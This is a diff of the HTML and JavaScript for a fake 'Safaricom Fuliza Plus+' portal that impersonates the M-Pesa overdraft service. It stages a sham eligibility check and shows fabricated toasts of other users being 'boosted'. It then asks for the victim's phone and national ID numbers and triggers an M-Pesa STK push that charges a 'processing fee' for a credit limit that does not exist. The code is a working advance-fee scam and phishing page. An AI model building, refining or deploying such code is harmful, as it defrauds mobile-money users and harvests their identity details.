@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="data:,">
     <title>Safaricom Fuliza Plus+ | Official Verification Portal</title>
     <script src="https://cdn.tailwindcss.com/"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
@@ -530,556 +531,428 @@
     </script>
 
     <script>
-        // Limits Data
-        const limitsData = [
-            {amt: 5000, fee: 150, tags: [], type: 'standard'},
-            {amt: 10000, fee: 350, tags: [], type: 'standard'},
-            {amt: 15000, fee: 530, tags: [], type: 'standard'},
-            {amt: 20000, fee: 700, tags: [], type: 'standard'},
-            {amt: 25000, fee: 1050, tags: [], type: 'standard'},
-            {amt: 30000, fee: 1500, tags: [], type: 'standard'},
-            {amt: 35000, fee: 2000, tags: ['instant', 'hot'], type: 'standard'},
-            {amt: 45000, fee: 2499, tags: ['instant', 'hot'], type: 'standard'},
-            {amt: 55000, fee: 625, type: 'hero'},
-            {amt: 50000, fee: 3000, tags: ['instant'], type: 'standard'},
-            {amt: 60000, fee: 3500, tags: ['instant'], type: 'standard'},
-            {amt: 65000, fee: 4500, tags: ['instant'], type: 'standard'},
-            {amt: 70000, fee: 5000, tags: ['instant'], type: 'standard'},
-            {amt: 72000, fee: 6500, tags: [], type: 'standard'},
-            {amt: 75000, fee: 6999, tags: [], type: 'standard'}
-        ];
+    // =========================
+    // GLOBAL API BASE
+    // =========================
+    const apiBase = window.location.origin;
 
-        const names = ["Brian O.", "Mercy W.", "Kevin K.", "Faith J.", "David M.", "Peter N.", "Sarah L."];
-        const amountsList = [21000, 15500, 50000, 120000, 80000, 150000];
+    // Limits Data
+    const limitsData = [
+        {amt: 5000, fee: 150, tags: [], type: 'standard'},
+        {amt: 10000, fee: 350, tags: [], type: 'standard'},
+        {amt: 15000, fee: 530, tags: [], type: 'standard'},
+        {amt: 20000, fee: 700, tags: [], type: 'standard'},
+        {amt: 25000, fee: 1050, tags: [], type: 'standard'},
+        {amt: 30000, fee: 1500, tags: [], type: 'standard'},
+        {amt: 35000, fee: 2000, tags: ['instant', 'hot'], type: 'standard'},
+        {amt: 45000, fee: 2499, tags: ['instant', 'hot'], type: 'standard'},
+        {amt: 55000, fee: 625, type: 'hero'},
+        {amt: 50000, fee: 3000, tags: ['instant'], type: 'standard'},
+        {amt: 60000, fee: 3500, tags: ['instant'], type: 'standard'},
+        {amt: 65000, fee: 4500, tags: ['instant'], type: 'standard'},
+        {amt: 70000, fee: 5000, tags: ['instant'], type: 'standard'},
+        {amt: 72000, fee: 6500, tags: [], type: 'standard'},
+        {amt: 75000, fee: 6999, tags: [], type: 'standard'}
+    ];
 
-        // Live Toast
-        function showLiveToast() {
-            const name = names[Math.floor(Math.random() * names.length)];
-            const amt = amountsList[Math.floor(Math.random() * amountsList.length)];
-            const safPrefixes = ["070", "071", "072", "074", "079", "011"];
-            const prefix = safPrefixes[Math.floor(Math.random() * safPrefixes.length)];
-            const phone = prefix + Math.floor(Math.random() * 9) + "***" + Math.floor(100 + Math.random() * 900);
+    let selectedLimit = null;
+    let selectedFee = null;
 
-            const toastMsg = document.getElementById('toast-msg');
-            if(toastMsg) {
-                toastMsg.innerHTML = `${name} (${phone}) boosted to <span class="text-safaricom">Ksh ${amt.toLocaleString()}</span> just now`;
-                const toast = document.getElementById('live-toast');
-                toast.classList.add('show');
-                setTimeout(() => toast.classList.remove('show'), 4000);
-            }
-        }
-        setInterval(showLiveToast, 15000);
+    let paymentReference = null;
+    let paymentPoller = null;
+    let paymentBusy = false;
 
-        // Verification Flow
-        function startVerification() {
-            const ph = document.getElementById('checkPhone').value;
-            if(!ph || ph.length < 10) return alert("Enter valid number");
-            document.getElementById('eligibilityBtn').innerText = "Processing...";
-            setTimeout(() => {
-                document.getElementById('check-step').classList.add('hidden');
-                document.getElementById('verifying-step').classList.remove('hidden');
+    // =========================
+    // BUILD LIMIT CARDS
+    // =========================
+    const grid = document.getElementById('grid-container');
+    const upgradeBtn = document.getElementById('main-upgrade-btn');
 
-                let steps = ["Connecting to Node...", "Checking M-Pesa History...", "Verifying ID...", "Generating Offer..."];
-                let i = 0;
-                let logInt = setInterval(() => {
-                    if(i < steps.length) {
-                        document.getElementById('status-text').innerText = steps[i];
-                        i++;
-                    } else {
-                        clearInterval(logInt);
-                        document.getElementById('verifying-step').classList.add('hidden');
-                        document.getElementById('result-step').classList.remove('hidden');
-                        document.getElementById('displayNum').innerText = ph;
-                        document.getElementById('phoneNum').value = ph;
-                    }
-                }, 1500);
-            }, 800);
-        }
+    limitsData.forEach(l => {
+        const div = document.createElement('div');
 
-        function revealMainSite() {
-            document.getElementById('landing-page').classList.add('hidden-site');
-            document.getElementById('main-content').classList.remove('hidden-site');
-            window.scrollTo({top: 0, behavior: 'smooth'});
-            startZuriNudge();
-        }
+        if (l.type === 'hero') {
+            div.className = "hero-offer";
+            div.innerHTML = `
+                <span class="offer-label">
+                    <i class="fas fa-star mr-1"></i>
+                    SPECIAL OFFER
+                </span>
 
-        // Limits Grid
-        let selectedLimit = null, selectedFee = null;
-        const grid = document.getElementById('grid-container');
-        const upgradeBtn = document.getElementById('main-upgrade-btn');
+                <div class="offer-amt">
+                    Ksh ${l.amt.toLocaleString()}
+                </div>
 
-        limitsData.forEach(l => {
-            const div = document.createElement('div');
-            if (l.type === 'hero') {
-                div.className = "hero-offer";
-                div.innerHTML = `
-                    <span class="offer-label"><i class="fas fa-star mr-1"></i> SPECIAL EXCLUSIVE OFFER</span>
-                    <div class="offer-amt">Ksh ${l.amt.toLocaleString()}</div>
-                    <div class="flex items-center justify-center gap-3 mt-3 flex-wrap">
-                        <div class="hero-fee-pill">Processing Fee: <strong>Ksh ${l.fee}</strong></div>
-                        <button onclick="claimHeroOffer()" class="btn-hero cursor-pointer">Claim Offer! <i class="fas fa-chevron-right ml-1"></i></button>
+                <div class="flex items-center justify-center gap-3 mt-3 flex-wrap">
+                    <div class="hero-fee-pill">
+                        Processing Fee: Ksh ${l.fee}
+                    </div>
+
+                    <button onclick="claimHeroOffer()" class="btn-hero">
+                        Claim Offer
+                    </button>
+                </div>
+            `;
+        } else {
+
+            let tagsHTML = '';
+
+            if (l.tags.includes('instant')) {
+                tagsHTML += `
+                    <div class="tag-instant">
+                        Instant
                     </div>
                 `;
-            } else {
-                div.className = "limit-card";
-                let tagsHTML = '';
-                if (l.tags.includes('instant')) tagsHTML += `<div class="tag-instant"><i class="fas fa-fire-alt text-xs"></i> Instant Access</div>`;
-                if (l.tags.includes('hot')) tagsHTML += `<div class="tag-hot">HOT</div>`;
+            }
 
-                div.innerHTML = `
-                    ${tagsHTML}
-                    <p class="limit-amt">Ksh ${l.amt.toLocaleString()}</p>
-                    <p class="limit-fee">Fee: Ksh ${l.fee}</p>
-                    <div class="arrow-icon"><i class="fas fa-chevron-right"></i></div>
+            if (l.tags.includes('hot')) {
+                tagsHTML += `
+                    <div class="tag-hot">
+                        HOT
+                    </div>
                 `;
-
-                div.onclick = () => {
-                    document.querySelectorAll('.limit-card, .hero-offer').forEach(c => c.classList.remove('active-card'));
-                    div.classList.add('active-card');
-                    selectedLimit = l.amt;
-                    selectedFee = l.fee;
-                    upgradeBtn.innerText = `UPGRADE TO KSH ${l.amt.toLocaleString()}`;
-                    upgradeBtn.classList.remove('hidden');
-                    upgradeBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                };
-            }
-            grid.appendChild(div);
-        });
-
-        function claimHeroOffer() {
-            selectedLimit = 55000;
-            selectedFee = 625;
-            checkSelection();
-        }
-
-        function checkSelection() {
-            if(!selectedLimit) return alert("Please select a limit first");
-            document.getElementById('sumLimit').innerText = "Ksh " + selectedLimit.toLocaleString();
-            document.getElementById('sumFee').innerText = "Ksh " + selectedFee;
-            document.getElementById('paymentModal').classList.replace('hidden', 'flex');
-        }
-
-        function closeModal() {
-            clearInterval(paymentPoller);
-            paymentBusy = false;
-            paymentReference = null;
-            paymentReferences = [];
-            paymentPhone = null;
-            document.getElementById('paymentModal').classList.replace('flex', 'hidden');
-            document.getElementById('input-step').classList.remove('hidden');
-            document.getElementById('response-step').classList.add('hidden');
-            document.getElementById('success-step').classList.add('hidden');
-        }
-
-        // ========== HashBack STK Logic ==========
-        let paymentReference = null;
-        let paymentReferences = [];
-        let paymentPoller = null;
-        let paymentBusy = false;
-        let paymentPhone = null;
-
-        // Clean phone number (e.g., 0712345678 -> 254712345678)
-        function cleanPhone(phone) {
-            phone = String(phone || '').replace(/\s+/g, '').replace(/^\+/, '');
-            if (phone.startsWith('07') || phone.startsWith('01')) {
-                return '254' + phone.substring(1);
-            }
-            if (phone.startsWith('7') || phone.startsWith('1')) {
-                return '254' + phone;
-            }
-            if (phone.startsWith('254')) {
-                return phone;
-            }
-            throw new Error('Enter a valid M-Pesa number.');
-        }
-
-        // Generate a unique reference (e.g., FULIZA-1234567890-123456)
-        function createPaymentReference() {
-            return `FULIZA-${Date.now()}-${Math.floor(100000 + Math.random() * 900000)}`;
-        }
-
-        // Normalize payment status (e.g., "Success" -> "completed")
-        function normalizePaymentStatus(status) {
-            const s = String(status || '').toLowerCase().trim();
-            if (/paid|success|successful|complete|completed|confirmed/.test(s)) {
-                return 'completed';
-            }
-            if (/cancel|declin|reject|fail|timeout|insufficient|invalid|error/.test(s)) {
-                return 'failed';
-            }
-            return 'pending';
-        }
-
-        // Collect all possible reference candidates from API response
-        function collectReferenceCandidates(data, fallbackReference) {
-            const candidates = [
-                data?.payhero_reference,
-                data?.reference,
-                data?.external_reference,
-                data?.externalReference,
-                data?.MerchantRequestID,
-                data?.merchantRequestID,
-                data?.CheckoutRequestID,
-                data?.checkoutRequestID,
-                data?.checkout_id,
-                data?.data?.payhero_reference,
-                data?.data?.reference,
-                data?.data?.external_reference,
-                data?.data?.MerchantRequestID,
-                data?.data?.CheckoutRequestID,
-                fallbackReference
-            ]
-            .filter(Boolean)
-            .map(v => String(v).trim())
-            .filter(Boolean);
-
-            return [...new Set(candidates)];
-        }
-
-        // Recursively extract all string values from an object
-        function deepValues(obj) {
-            const values = [];
-            const walk = value => {
-                if (value === null || value === undefined) return;
-                if (typeof value === 'object') {
-                    if (Array.isArray(value)) value.forEach(walk);
-                    else Object.values(value).forEach(walk);
-                    return;
-                }
-                values.push(String(value));
-            };
-            walk(obj);
-            return values;
-        }
-
-        // Determine payment status from API response
-        function getVerificationStatus(data) {
-            const direct =
-                data?.status ||
-                data?.payment_status ||
-                data?.paymentStatus ||
-                data?.transaction_status ||
-                data?.transactionStatus ||
-                data?.state ||
-                data?.ResultDesc ||
-                data?.resultDesc ||
-                data?.message ||
-                data?.data?.status ||
-                data?.data?.payment_status ||
-                data?.data?.paymentStatus ||
-                data?.data?.transaction_status ||
-                data?.data?.transactionStatus ||
-                data?.data?.state ||
-                data?.data?.ResultDesc ||
-                data?.data?.resultDesc ||
-                data?.data?.message;
-
-            const directStatus = normalizePaymentStatus(direct);
-            if (directStatus !== 'pending') return directStatus;
-
-            const resultCode =
-                data?.ResultCode ??
-                data?.resultCode ??
-                data?.data?.ResultCode ??
-                data?.data?.resultCode;
-
-            if (String(resultCode) === '0') return 'completed';
-
-            const allText = deepValues(data).join(' ').toLowerCase();
-            if (/mpesa receipt|mpesaReceipt|receipt number|confirmed|successful|success|paid|completed/.test(allText)) return 'completed';
-            if (/cancelled|canceled|declined|failed|insufficient|timeout|error/.test(allText)) return 'failed';
-
-            return 'pending';
-        }
-
-        // Extract receipt number from API response
-        function getReceiptFromVerification(data, fallbackReference) {
-            return data?.mpesaReceipt ||
-                data?.mpesaReceiptNumber ||
-                data?.receipt ||
-                data?.receipt_number ||
-                data?.receiptNumber ||
-                data?.data?.mpesaReceipt ||
-                data?.data?.mpesaReceiptNumber ||
-                data?.data?.receipt ||
-                data?.data?.receipt_number ||
-                data?.data?.receiptNumber ||
-                fallbackReference ||
-                'Confirmed';
-        }
-
-        // Update payment status UI
-        function setPaymentStatus(mode, title, text, statusText) {
-            const spinner = document.getElementById('paySpinner');
-            const icon = document.getElementById('payIcon');
-            const titleEl = document.getElementById('payStatusTitle');
-            const textEl = document.getElementById('payStatusText');
-            const displayStatus = document.getElementById('payDisplayStatus');
-
-            titleEl.innerText = title;
-            textEl.innerText = text;
-            displayStatus.innerText = statusText || title;
-
-            icon.className = 'hidden w-14 h-14 rounded-full mx-auto mb-4 items-center justify-center';
-            icon.innerHTML = '';
-
-            if (mode === 'loading') {
-                spinner.classList.remove('hidden');
-                return;
             }
 
-            spinner.classList.add('hidden');
-            icon.classList.remove('hidden');
-            icon.classList.add('flex');
+            div.className = "limit-card";
 
-            if (mode === 'success') {
-                icon.classList.add('bg-green-100', 'text-green-600');
-                icon.innerHTML = '<i class="fas fa-check text-3xl"></i>';
-            } else if (mode === 'error') {
-                icon.classList.add('bg-red-100', 'text-red-600');
-                icon.innerHTML = '<i class="fas fa-times text-3xl"></i>';
-            } else {
-                icon.classList.add('bg-blue-100', 'text-blue-600');
-                icon.innerHTML = '<i class="fas fa-mobile-alt text-3xl"></i>';
-            }
-        }
+            div.innerHTML = `
+                ${tagsHTML}
 
-        // Initiate STK Push
-        async function initiatePayment() {
-            const rawPhone = document.getElementById('phoneNum').value;
-            const id = document.getElementById('idNum').value;
+                <p class="limit-amt">
+                    Ksh ${l.amt.toLocaleString()}
+                </p>
 
-            if(!rawPhone || rawPhone.length < 10 || !id) {
-                return alert("Fill in all details");
-            }
+                <p class="limit-fee">
+                    Fee: Ksh ${l.fee}
+                </p>
 
-            if (!selectedFee) {
-                return alert("Select a limit first");
-            }
+                <div class="arrow-icon">
+                    <i class="fas fa-chevron-right"></i>
+                </div>
+            `;
 
-            if (paymentBusy) return;
+            div.onclick = () => {
 
-            paymentBusy = true;
-            paymentReferences = [];
-
-            document.getElementById('input-step').classList.add('hidden');
-            document.getElementById('success-step').classList.add('hidden');
-            document.getElementById('response-step').classList.remove('hidden');
-
-            try {
-                paymentPhone = cleanPhone(rawPhone);
-                const originalReference = createPaymentReference();
-                paymentReference = originalReference;
-                paymentReferences = [originalReference];
-
-                document.getElementById('payDisplayAmount').innerText = `Ksh ${Number(selectedFee).toLocaleString()}`;
-                document.getElementById('payDisplayPhone').innerText = paymentPhone;
-
-                setPaymentStatus(
-                    'loading',
-                    'Sending M-Pesa Prompt',
-                    'Please wait while we send the STK request to your phone.',
-                    'Sending'
-                );
-
-                const apiBase = window.location.origin;
-const response = await fetch(`${apiBase}/api/stk`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        phone_number: paymentPhone,
-                        amount: selectedFee,
-                        reference: originalReference,
-                        platform: "WJ404O"
-                    })
+                document.querySelectorAll('.limit-card').forEach(c => {
+                    c.classList.remove('active-card');
                 });
 
-                const text = await response.text();
-                let data = {};
+                div.classList.add('active-card');
 
-                try {
-                    data = text ? JSON.parse(text) : {};
-                } catch (e) {
-                    throw new Error(text || 'Unexpected server response');
-                }
+                selectedLimit = l.amt;
+                selectedFee = l.fee;
 
-                if (!response.ok) {
-                    throw new Error(data.message || data.error || `STK request failed (${response.status})`);
-                }
+                upgradeBtn.innerText =
+                    `UPGRADE TO KSH ${l.amt.toLocaleString()}`;
 
-                paymentReferences = collectReferenceCandidates(data, originalReference);
-                paymentReference = paymentReferences[0] || originalReference;
+                upgradeBtn.classList.remove('hidden');
+            };
+        }
 
-                setPaymentStatus(
-                    'info',
-                    'Prompt Sent Successfully',
-                    'Check your phone and enter your M-Pesa PIN. We are verifying automatically.',
-                    'Waiting for payment'
+        grid.appendChild(div);
+    });
+
+    // =========================
+    // HERO OFFER
+    // =========================
+    function claimHeroOffer() {
+        selectedLimit = 55000;
+        selectedFee = 625;
+        checkSelection();
+    }
+
+    // =========================
+    // VERIFICATION FLOW
+    // =========================
+    function startVerification() {
+
+        const ph = document.getElementById('checkPhone').value;
+
+        if (!ph || ph.length < 10) {
+            alert("Enter valid Safaricom number");
+            return;
+        }
+
+        document.getElementById('check-step').classList.add('hidden');
+        document.getElementById('verifying-step').classList.remove('hidden');
+
+        const steps = [
+            "Connecting to Safaricom...",
+            "Checking M-Pesa profile...",
+            "Checking Fuliza score...",
+            "Generating approval..."
+        ];
+
+        let i = 0;
+
+        const interval = setInterval(() => {
+
+            document.getElementById('status-text').innerText = steps[i];
+
+            i++;
+
+            if (i >= steps.length) {
+
+                clearInterval(interval);
+
+                setTimeout(() => {
+
+                    document.getElementById('verifying-step').classList.add('hidden');
+
+                    document.getElementById('result-step').classList.remove('hidden');
+
+                    document.getElementById('displayNum').innerText = ph;
+
+                    document.getElementById('phoneNum').value = ph;
+
+                }, 1500);
+            }
+
+        }, 1500);
+    }
+
+    // =========================
+    // REVEAL MAIN SITE
+    // =========================
+    function revealMainSite() {
+
+        document.getElementById('landing-page')
+            .classList.add('hidden-site');
+
+        document.getElementById('main-content')
+            .classList.remove('hidden-site');
+
+        window.scrollTo({
+            top: 0,
+            behavior: 'smooth'
+        });
+    }
+
+    // =========================
+    // PAYMENT MODAL
+    // =========================
+    function checkSelection() {
+
+        if (!selectedLimit) {
+            alert("Please select a limit");
+            return;
+        }
+
+        document.getElementById('sumLimit').innerText =
+            `Ksh ${selectedLimit.toLocaleString()}`;
+
+        document.getElementById('sumFee').innerText =
+            `Ksh ${selectedFee}`;
+
+        document.getElementById('paymentModal')
+            .classList.replace('hidden', 'flex');
+    }
+
+    function closeModal() {
+
+        clearInterval(paymentPoller);
+
+        paymentBusy = false;
+
+        document.getElementById('paymentModal')
+            .classList.replace('flex', 'hidden');
+
+        document.getElementById('input-step')
+            .classList.remove('hidden');
+
+        document.getElementById('response-step')
+            .classList.add('hidden');
+
+        document.getElementById('success-step')
+            .classList.add('hidden');
+    }
+
+    // =========================
+    // PHONE CLEANER
+    // =========================
+    function cleanPhone(phone) {
+
+        phone = phone.replace(/\s+/g, '');
+
+        if (phone.startsWith('07')) {
+            return '254' + phone.substring(1);
+        }
+
+        if (phone.startsWith('01')) {
+            return '254' + phone.substring(1);
+        }
+
+        if (phone.startsWith('254')) {
+            return phone;
+        }
+
+        return phone;
+    }
+
+    // =========================
+    // INITIATE PAYMENT
+    // =========================
+    async function initiatePayment() {
+
+        const phone =
+            document.getElementById('phoneNum').value;
+
+        const id =
+            document.getElementById('idNum').value;
+
+        if (!phone || !id) {
+            alert("Fill all details");
+            return;
+        }
+
+        if (paymentBusy) return;
+
+        paymentBusy = true;
+
+        document.getElementById('input-step')
+            .classList.add('hidden');
+
+        document.getElementById('response-step')
+            .classList.remove('hidden');
+
+        try {
+
+            const cleanedPhone = cleanPhone(phone);
+
+            paymentReference =
+                'FULIZA-' + Date.now();
+
+            const response = await fetch(`${apiBase}/api/stk`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    phone_number: cleanedPhone,
+                    amount: selectedFee,
+                    reference: paymentReference
+                })
+            });
+
+            const data = await response.json();
+
+            if (!response.ok) {
+                throw new Error(
+                    data.message || 'STK failed'
+                );
+            }
+
+            document.getElementById('payDisplayAmount')
+                .innerText =
+                `Ksh ${selectedFee}`;
+
+            document.getElementById('payDisplayPhone')
+                .innerText =
+                cleanedPhone;
+
+            document.getElementById('payDisplayStatus')
+                .innerText =
+                'Waiting';
+
+            startPaymentPolling();
+
+        } catch (err) {
+
+            paymentBusy = false;
+
+            alert(err.message);
+        }
+    }
+
+    // =========================
+    // POLLING
+    // =========================
+    function startPaymentPolling() {
+
+        clearInterval(paymentPoller);
+
+        paymentPoller = setInterval(async () => {
+
+            const result =
+                await verifyPaymentStatus();
+
+            if (
+                result === 'completed' ||
+                result === 'failed'
+            ) {
+
+                clearInterval(paymentPoller);
+            }
+
+        }, 4000);
+    }
+
+    // =========================
+    // VERIFY PAYMENT
+    // =========================
+    async function verifyPaymentStatus() {
+
+        try {
+
+            const response =
+                await fetch(
+                    `${apiBase}/api/verify?reference=${paymentReference}`
                 );
 
-                startPaymentPolling();
+            const data = await response.json();
 
-            } catch (error) {
+            if (
+                data.status === 'success' ||
+                data.status === 'completed'
+            ) {
+
+                showSuccess();
+
+                return 'completed';
+            }
+
+            if (
+                data.status === 'failed'
+            ) {
+
                 paymentBusy = false;
-                setPaymentStatus(
-                    'error',
-                    'Payment Request Failed',
-                    error.message || 'Unable to send the M-Pesa prompt. Please try again.',
-                    'Failed'
-                );
-            }
-        }
 
-        // Start polling for payment status
-        function startPaymentPolling() {
-            clearInterval(paymentPoller);
+                alert("Payment failed");
 
-            let attempts = 0;
-            const maxAttempts = 25;
-
-            paymentPoller = setInterval(async () => {
-                attempts++;
-
-                const result = await verifyPaymentStatus(true);
-
-                if (result === 'completed' || result === 'failed') {
-                    clearInterval(paymentPoller);
-                    return;
-                }
-
-                if (attempts >= maxAttempts) {
-                    clearInterval(paymentPoller);
-                    paymentBusy = false;
-                    setPaymentStatus(
-                        'info',
-                        'Payment Still Processing',
-                        'We are still checking automatically. If you approved the STK prompt, please wait here or tap the button below to check again.',
-                        'Pending'
-                    );
-                }
-            }, 4000);
-        }
-
-        // Verify payment status via API
-        async function verifyPaymentStatus(silentPending = false) {
-            const refs = [...new Set((paymentReferences.length ? paymentReferences : [paymentReference]).filter(Boolean))];
-
-            if (!refs.length) {
-                return 'pending';
-            }
-
-            let lastMessage = '';
-
-            for (const ref of refs) {
-                try {
-                    const response = await fetch(`${apiBase}/api/verify?reference=${encodeURIComponent(ref)}`, {
-                        method: 'GET',
-                        headers: {
-                            'Accept': 'application/json'
-                        }
-                    });
-
-                    const text = await response.text();
-                    let data = {};
-
-                    try {
-                        data = text ? JSON.parse(text) : {};
-                    } catch (e) {
-                        data = { status: 'pending', message: text };
-                    }
-
-                    if (!response.ok) {
-                        const msg = String(data.message || data.error || text || '').toLowerCase();
-                        lastMessage = data.message || data.error || text || lastMessage;
-
-                        if (
-                            msg.includes('no payment found') ||
-                            msg.includes('not found') ||
-                            response.status === 404
-                        ) {
-                            continue;
-                        }
-
-                        throw new Error(data.message || data.error || `Verification failed (${response.status})`);
-                    }
-
-                    const status = getVerificationStatus(data);
-
-                    if (status === 'completed') {
-                        paymentReference = ref;
-                        paymentBusy = false;
-                        clearInterval(paymentPoller);
-                        showSuccess(getReceiptFromVerification(data, ref));
-                        return 'completed';
-                    }
-
-                    if (status === 'failed') {
-                        paymentReference = ref;
-                        paymentBusy = false;
-                        clearInterval(paymentPoller);
-                        setPaymentStatus(
-                            'error',
-                            'Payment Not Completed',
-                            data.message || data.error || 'The payment was cancelled or failed. Please try again.',
-                            'Failed'
-                        );
-                        return 'failed';
-                    }
-
-                    lastMessage = data.message || data.error || lastMessage;
-
-                } catch (error) {
-                    lastMessage = error.message || lastMessage;
-                }
-            }
-
-            if (!silentPending) {
-                setPaymentStatus(
-                    'info',
-                    'Payment Still Processing',
-                    'We are still waiting for confirmation. If you approved the STK prompt, please wait a few seconds and tap check status again.',
-                    'Pending'
-                );
+                return 'failed';
             }
 
             return 'pending';
+
+        } catch (err) {
+
+            console.log(err);
+
+            return 'pending';
         }
+    }
 
-        async function checkPaymentNow() {
-            const btn = document.getElementById('checkPaymentBtn');
-            if (!paymentReference || btn.disabled) return;
+    // =========================
+    // MANUAL CHECK
+    // =========================
+    async function checkPaymentNow() {
+        await verifyPaymentStatus();
+    }
 
-            btn.disabled = true;
-            btn.classList.add('opacity-70');
-            const oldText = btn.innerText;
-            btn.innerText = 'Checking Payment...';
+    // =========================
+    // SUCCESS
+    // =========================
+    function showSuccess() {
 
-            await verifyPaymentStatus(false);
+        paymentBusy = false;
 
-            btn.disabled = false;
-            btn.classList.remove('opacity-70');
-            btn.innerText = oldText;
-        }
+        document.getElementById('response-step')
+            .classList.add('hidden');
 
-        function showSuccess(receiptNo) {
-            clearInterval(paymentPoller);
-            paymentBusy = false;
-            document.getElementById('response-step').classList.add('hidden');
-            document.getElementById('success-step').classList.remove('hidden');
-            hasUserReachedFinalStep = true;
-
-            setTimeout(() => {
-                Tawk_API.showWidget();
-                if (window.innerWidth > 768) {
-                    Tawk_API.maximize();
-                }
-                Tawk_API.addEvent('payment-verification', { status: 'pending' });
-            }, 1000);
-        }
-    </script>
+        document.getElementById('success-step')
+            .classList.remove('hidden');
+    }
+</script>
 </body>
 
 <!-- Mirrored from m-pesa-fuliza.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 May 2026 19:48:14 GMT -->
